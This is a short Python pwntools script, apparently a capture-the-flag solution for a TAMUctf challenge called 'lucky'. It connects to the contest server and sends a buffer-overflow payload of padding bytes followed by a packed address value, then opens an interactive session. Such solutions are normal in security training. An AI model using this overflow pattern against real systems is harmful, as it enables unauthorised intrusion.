from pwn import *

p = remote("tamuctf.com", 443, ssl=True, sni="lucky")
p.sendline(b'A' * 12 + p32(0x563412))
p.interactive()
